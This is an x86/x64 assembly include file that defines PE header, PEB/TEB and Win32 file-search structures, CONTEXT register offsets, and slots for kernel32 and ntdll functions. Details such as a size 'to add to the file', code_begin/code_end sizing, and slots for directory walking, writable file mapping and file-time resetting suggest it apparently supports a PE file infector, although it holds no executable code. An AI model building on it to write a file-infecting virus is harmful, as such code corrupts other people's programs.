MAX_PATH                                 equ    260

GMEM_ZEROINIT                            equ    40h

CREATE_ALWAYS                            equ    2
OPEN_EXISTING                            equ    3                  ;unused
GENERIC_WRITE                            equ    40000000h          ;unused
GENERIC_READ                             equ    80000000h          ;unused

FILE_ATTRIBUTE_DIRECTORY                 equ    10h
FILE_ATTRIBUTE_ARCHIVE                   equ    20h

PAGE_READWRITE                           equ    4
SECTION_MAP_WRITE                        equ    2
FILE_MAP_WRITE                           equ    SECTION_MAP_WRITE

EXCEPTION_CONTINUE_EXECUTION             equ    -1

pebImagebase                             equ    8

CONTEXT_RIP                              equ    0f8h
CONTEXT_RSP                              equ    98h
CONTEXT_RDX                              equ    88h                ;unused

CONTEXT_EIP                              equ    0b8h
CONTEXT_ESP                              equ    0c4h
CONTEXT_EDX                              equ    0a8h               ;unused

IMAGE_DOS_SIGNATURE                      equ    5a4dh
IMAGE_NT_SIGNATURE                       equ    4550h

IMAGE_FILE_MACHINE_I386                  equ    14ch               ;unused
IMAGE_FILE_MACHINE_AMD64                 equ    8664h
IMAGE_FILE_EXECUTABLE_IMAGE              equ    2
IMAGE_FILE_SYSTEM                        equ    1000h              ;unused
IMAGE_FILE_DLL                           equ    2000h              ;unused

IMAGE_NT_OPTIONAL_HDR64_MAGIC            equ    20bh
IMAGE_NT_OPTIONAL_HDR32_MAGIC            equ    10bh               ;unused

IMAGE_SUBSYSTEM_WINDOWS_GUI              equ    2                  ;unused
IMAGE_SUBSYSTEM_WINDOWS_CUI              equ    3

IMAGE_SCN_MEM_WRITE                      equ    80000000h
IMAGE_SCN_MEM_EXECUTE                    equ    20000000h

IMAGE_EXPORT_DIRECTORY32                 equ    78h
IMAGE_EXPORT_DIRECTORY64                 equ    88h                ;unused

ADDSIZE                                  equ    1                  ;size to add to the file

codesize                                 equ    (offset code_end - offset code_begin)

                                         ;for non-standard values, change anything that says standard ;)

sectalign                                equ    1000h              ;standard
filealign                                equ    200h               ;standard

sectphys                                 equ    200h               ;standard
sectrsize                                equ    ((codesize + (filealign - 1)) and not (filealign - 1))
sectvadd                                 equ    sectalign          ;standard
sectvsize                                equ    ((codesize + (sectalign - 1)) and not (sectalign - 1))
imagesize                                equ    sectvadd + sectvsize
                                                                   ;standard
hdrssize                                 equ    sectphys           ;standard

exesize                                  equ    sectphys + sectrsize     

ntdll struct
  ntRtlRemoveVectoredExceptionHandler dd ?
  ntRtlAddVectoredExceptionHandler    dd ?
ntdll ends

kernel32 struct
  kUnmapViewOfFile    dd ?
  kSetFileTime        dd ?
  kSetFilePointer     dd ?
  kSetFileAttributesW dd ?
  kSetEndOfFile       dd ?
  kMapViewOfFile      dd ?
  kFindNextFileW      dd ?
  kFindFirstFileW     dd ?
  kFindClose          dd ?
  kCreateFileW        dd ?
  kCreateFileMappingW dd ?
  kCloseHandle        dd ?
kernel32 ends

EXCEPTION_POINTERS struct
  ExceptionRecord dd ?
  ContextRecord   dd ?
EXCEPTION_POINTERS ends

mLIST_ENTRY32 struct                         ;unused
    FLink dd ?
    BLink dd ?
mLIST_ENTRY32 ends

mPEB_LDR_DATA32 struct                       ;unused
    dwLength                          dd ?
    bInitialized                      dd ?
    dwSsHandle                        dd ?
    dwInLoadOrderModuleList           mLIST_ENTRY32 <?>
    dwInMemoryOrderModuleList         mLIST_ENTRY32 <?>
    dwInInitializationOrderModuleList mLIST_ENTRY32 <?>
mPEB_LDR_DATA32 ends

mPROCESS_ENVIRONMENT_BLOCK32 struct
	bInhiritedAddressSpace    db ?
	bReadImageFileExecOptions db ?
	bBeingDebugged            db ?
	bSpare                    db ?
	hMutant                   dd ?
	dwImageBaseAddress        dd ?
	lpLoaderData              dd ?
	lpProcessParameters       dd ?
mPROCESS_ENVIRONMENT_BLOCK32 ends

mTEB32 struct
    TIB                       db 1ch dup (?)
    EnvironmentPointer        dd ?
    Unknown                   dd ?
    ClientId                  dd ?
    ActiveRpcHandle           dd ?
    TLSPointer                dd ?
    pProcessEnvironmentBlock  dd ?
mTEB32 ends

IMAGE_DOS_HEADER struct
  e_magic    dw ?
  e_cblp     dw ?
  e_cp       dw ?
  e_crlc     dw ?
  e_cparhdr  dw ?
  e_minalloc dw ?
  e_maxalloc dw ?
  e_ss       dw ?
  e_sp       dw ?
  e_csum     dw ?
  e_ip       dw ?
  e_cs       dw ?
  e_lfarlc   dw ?
  e_ovno     dw ?
  e_res      dw 4 dup (?)
  e_oemid    dw ?
  e_oeminfo  dw ?
  e_res2     dw 0ah dup (?)
  e_lfanew   dd ?
IMAGE_DOS_HEADER ends

IMAGE_FILE_HEADER struct
  Machine              dw ?
  NumberOfSections     dw ?
  TimeDateStamp        dd ?
  PointerToSymbolTable dd ?
  NumberOfSymbols      dd ?
  SizeOfOptionalHeader dw ?
  Characteristics      dw ?
IMAGE_FILE_HEADER ends

IMAGE_OPTIONAL_HEADER32 struct               ;unused
  Magic                       dw ?
  MajorLinkerVersion          db ?
  MinorLinkerVersion          db ?
  SizeOfCode                  dd ?
  SizeOfInitializedData       dd ?
  SizeOfUninitializedData     dd ?
  AddressOfEntryPoint         dd ?
  BaseOfCode                  dd ?
  BaseOfData                  dd ?
  ImageBase                   dd ?
  SectionAlignment            dd ?
  FileAlignment               dd ?
  MajorOperatingSystemVersion dw ?
  MinorOperatingSystemVersion dw ?
  MajorImageVersion           dw ?
  MinorImageVersion           dw ?
  MajorSubsystemVersion       dw ?
  MinorSubsystemVersion       dw ?
  Win32VersionValue           dd ?
  SizeOfImage                 dd ?
  SizeOfHeaders               dd ?
  CheckSum                    dd ?
  Subsystem                   dw ?
  DllCharacteristics          dw ?
  SizeOfStackReserve          dd ?
  SizeOfStackCommit           dd ?
  SizeOfHeapReserve           dd ?
  SizeOfHeapCommit            dd ?
  LoaderFlags                 dd ?
  NumberOfRvaAndSizes         dd ?
IMAGE_OPTIONAL_HEADER32 ends

IMAGE_OPTIONAL_HEADER64 struct
  Magic                       dw ?
  MajorLinkerVersion          db ?
  MinorLinkerVersion          db ?
  SizeOfCode                  dd ?
  SizeOfInitializedData       dd ?
  SizeOfUninitializedData     dd ?
  AddressOfEntryPoint         dd ?
  BaseOfCode                  dd ?
  ImageBase                   dq ?
  SectionAlignment            dd ?
  FileAlignment               dd ?
  MajorOperatingSystemVersion dw ?
  MinorOperatingSystemVersion dw ?
  MajorImageVersion           dw ?
  MinorImageVersion           dw ?
  MajorSubsystemVersion       dw ?
  MinorSubsystemVersion       dw ?
  Win32VersionValue           dd ?
  SizeOfImage                 dd ?
  SizeOfHeaders               dd ?
  CheckSum                    dd ?
  Subsystem                   dw ?
  DllCharacteristics          dw ?
  SizeOfStackReserve          dq ?
  SizeOfStackCommit           dq ?
  SizeOfHeapReserve           dq ?
  SizeOfHeapCommit            dq ?
  LoaderFlags                 dd ?
  NumberOfRvaAndSizes         dd ?
IMAGE_OPTIONAL_HEADER64 ends

IMAGE_NT_HEADERS struct                      ;unused
    Signature      dd ?
    FileHeader     IMAGE_FILE_HEADER       <>
    OptionalHeader IMAGE_OPTIONAL_HEADER32 <>
IMAGE_NT_HEADERS ends

IMAGE_NT_HEADERS64 struct
    Signature      dd ?
    FileHeader     IMAGE_FILE_HEADER       <>
    OptionalHeader IMAGE_OPTIONAL_HEADER64 <>
IMAGE_NT_HEADERS64 ends

IMAGE_SECTION_HEADER struct                  ;unused
  Name1                db 8 dup (?)
  VirtualSize          dd ?
  VirtualAddress       dd ?
  SizeOfRawData        dd ?
  PointerToRawData     dd ?
  PointerToRelocations dd ?
  PointerToLinenumbers dd ?
  NumberOfRelocations  dw ?
  NumberOfLinenumbers  dw ?
  Characteristics      dd ?
IMAGE_SECTION_HEADER ends

IMAGE_EXPORT_DIRECTORY struct
  Characteristics       dd ?
  TimeDateStamp         dd ?
  MajorVersion          dw ?
  MinorVersion          dw ?
  pName                 dd ?
  Base                  dd ?
  NumberOfFunctions     dd ?
  NumberOfNames         dd ?
  AddressOfFunctions    dd ?
  AddressOfNames        dd ?
  AddressOfNameOrdinals dd ?
IMAGE_EXPORT_DIRECTORY ends

FILETIME struct
  dwLowDateTime  dd ?
  dwHighDateTime dd ?
FILETIME ends

WIN32_FIND_DATAW struct
  dwFileAttributes dd ?
  ftCreationTime   FILETIME <?>
  ftLastAccessTime FILETIME <?>
  ftLastWriteTime  FILETIME <?>
  nFileSizeHigh    dd ?
  nFileSizeLow     dd ?
  dwReserved0      dd ?
  dwReserved1      dd ?
  cFileName        dw MAX_PATH dup (?)
  cAlternate       dw 0eh dup (?)
WIN32_FIND_DATAW ends